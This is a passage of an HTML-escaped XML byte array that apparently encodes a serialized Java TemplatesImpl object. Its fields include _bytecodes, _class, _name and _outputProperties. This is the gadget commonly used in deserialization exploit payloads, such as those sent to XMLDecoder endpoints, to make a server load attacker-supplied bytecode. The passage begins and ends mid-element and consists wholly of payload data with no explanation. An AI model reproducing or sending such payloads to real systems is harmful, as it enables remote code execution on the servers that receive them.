index="117"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="118"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="119"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="120"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="121"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="122"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="123"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="124"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="125"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="126"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="127"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="128"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="129"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="130"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="131"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="132"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="133"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="134"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="135"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="136"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="137"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="138"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="139"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="140"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="141"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="142"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="143"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="144"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="145"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="146"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="147"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="148"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="149"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="150"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="151"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="152"&gt; &lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="153"&gt; &lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="154"&gt; &lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="155"&gt; &lt;byte&gt;-63&lt;/byte&gt;&lt;/void&gt;&lt;void index="156"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="157"&gt; &lt;byte&gt;-84&lt;/byte&gt;&lt;/void&gt;&lt;void index="158"&gt; &lt;byte&gt;-85&lt;/byte&gt;&lt;/void&gt;&lt;void index="159"&gt; &lt;byte&gt;51&lt;/byte&gt;&lt;/void&gt;&lt;void index="160"&gt; &lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="162"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="163"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="165"&gt; &lt;byte&gt;13&lt;/byte&gt;&lt;/void&gt;&lt;void index="166"&gt; &lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="167"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="168"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="169"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="170"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="171"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="172"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="173"&gt; &lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="174"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="175"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="176"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="177"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="178"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="179"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="181"&gt; &lt;byte&gt;14&lt;/byte&gt;&lt;/void&gt;&lt;void index="182"&gt; &lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="183"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="184"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="185"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="186"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="187"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="188"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="189"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="190"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="191"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="192"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="193"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="194"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="195"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="196"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="198"&gt; &lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="199"&gt; &lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="200"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="201"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="202"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="203"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="204"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="205"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="206"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="207"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="208"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="209"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="210"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="212"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="213"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="214"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="215"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="216"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="217"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="218"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="219"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="220"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="221"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="222"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="223"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="224"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="225"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="226"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="227"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="228"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="229"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="230"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="231"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="232"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="233"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="234"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="235"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="236"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="237"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="238"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="239"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="240"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="241"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="242"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="243"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="244"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="245"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="246"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="247"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="248"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="249"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="250"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="251"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="252"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="253"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="254"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="255"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="256"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="257"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="258"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="259"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="260"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="261"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="262"&gt; &lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="263"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="264"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="265"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="266"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="267"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="268"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="269"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="270"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="271"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="272"&gt; &lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="274"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="275"&gt; &lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="276"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="277"&gt; &lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="278"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="279"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="280"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="281"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="282"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="283"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="284"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="285"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="287"&gt; &lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="288"&gt; &lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="289"&gt; &lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="290"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="291"&gt; &lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="293"&gt; &lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="294"&gt; &lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="295"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="296"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="297"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="298"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="299"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="300"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="302"&gt; &lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="303"&gt; &lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="304"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="305"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="306"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="307"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="308"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="309"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="310"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="311"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="312"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="313"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="314"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="315"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="316"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="317"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="318"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="319"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="320"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="321"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="323"&gt; &lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="324"&gt; &lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="325"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="326"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="327"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="328"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="329"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="331"&gt; &lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="332"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="333"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="334"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="335"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="336"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="337"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="338"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="339"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="340"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="341"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="342"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="343"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="344"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="345"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="346"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="347"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="348"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="349"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="350"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="352"&gt; &lt;byte&gt;17&lt;/byte&gt;&lt;/void&gt;&lt;void index="353"&gt; &lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="354"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="355"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="356"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="357"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="358"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="359"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="360"&gt; &lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="361"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="362"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="363"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="364"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="365"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="366"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="367"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="368"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="369"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="370"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="372"&gt; &lt;byte&gt;22&lt;/byte&gt;&lt;/void&gt;&lt;void index="373"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="374"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="375"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="376"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="377"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="378"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="379"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="380"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="381"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="382"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="383"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="384"&gt; &lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="385"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="386"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="387"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="388"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="389"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="390"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="391"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="392"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="393"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="394"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="395"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="396"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="401"&gt; &lt;byte&gt;-1&lt;/byte&gt;&lt;/void&gt;&lt;void index="402"&gt; &lt;byte&gt;-1&lt;/byte&gt;&lt;/void&gt;&lt;void index="403"&gt; &lt;byte&gt;-1&lt;/byte&gt;&lt;/void&gt;&lt;void index="404"&gt; &lt;byte&gt;-1&lt;/byte&gt;&lt;/void&gt;&lt;void index="405"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="406"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="407"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="409"&gt; &lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="410"&gt; &lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="411"&gt; &lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="412"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="413"&gt; &lt;byte&gt;75&lt;/byte&gt;&lt;/void&gt;&lt;void index="414"&gt; &lt;byte&gt;-3&lt;/byte&gt;&lt;/void&gt;&lt;void index="415"&gt; &lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="416"&gt; &lt;byte&gt;21&lt;/byte&gt;&lt;/void&gt;&lt;void index="417"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="418"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="419"&gt; &lt;byte&gt;-37&lt;/byte&gt;&lt;/void&gt;&lt;void index="420"&gt; &lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="421"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="424"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="425"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="429"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="430"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="431"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="433"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="434"&gt; &lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="435"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="436"&gt; &lt;byte&gt;-84&lt;/byte&gt;&lt;/void&gt;&lt;void index="437"&gt; &lt;byte&gt;-13&lt;/byte&gt;&lt;/void&gt;&lt;void index="438"&gt; &lt;byte&gt;23&lt;/byte&gt;&lt;/void&gt;&lt;void index="439"&gt; &lt;byte&gt;-8&lt;/byte&gt;&lt;/void&gt;&lt;void index="440"&gt; &lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="441"&gt; &lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="442"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="443"&gt; &lt;byte&gt;-32&lt;/byte&gt;&lt;/void&gt;&lt;void index="444"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="447"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="448"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="451"&gt; &lt;byte&gt;21&lt;/byte&gt;&lt;/void&gt;&lt;void index="452"&gt; &lt;byte&gt;-103&lt;/byte&gt;&lt;/void&gt;&lt;void index="453"&gt; &lt;byte&gt;-54&lt;/byte&gt;&lt;/void&gt;&lt;void index="454"&gt; &lt;byte&gt;-2&lt;/byte&gt;&lt;/void&gt;&lt;void index="455"&gt; &lt;byte&gt;-70&lt;/byte&gt;&lt;/void&gt;&lt;void index="456"&gt; &lt;byte&gt;-66&lt;/byte&gt;&lt;/void&gt;&lt;void index="460"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="462"&gt; &lt;byte&gt;-110&lt;/byte&gt;&lt;/void&gt;&lt;void index="463"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="465"&gt; &lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="467"&gt; &lt;byte&gt;34&lt;/byte&gt;&lt;/void&gt;&lt;void index="468"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="470"&gt; &lt;byte&gt;-112&lt;/byte&gt;&lt;/void&gt;&lt;void index="471"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="473"&gt; &lt;byte&gt;37&lt;/byte&gt;&lt;/void&gt;&lt;void index="474"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="476"&gt; &lt;byte&gt;38&lt;/byte&gt;&lt;/void&gt;&lt;void index="477"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="479"&gt; &lt;byte&gt;16&lt;/byte&gt;&lt;/void&gt;&lt;void index="480"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="481"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="482"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="483"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="484"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="485"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="486"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="487"&gt; 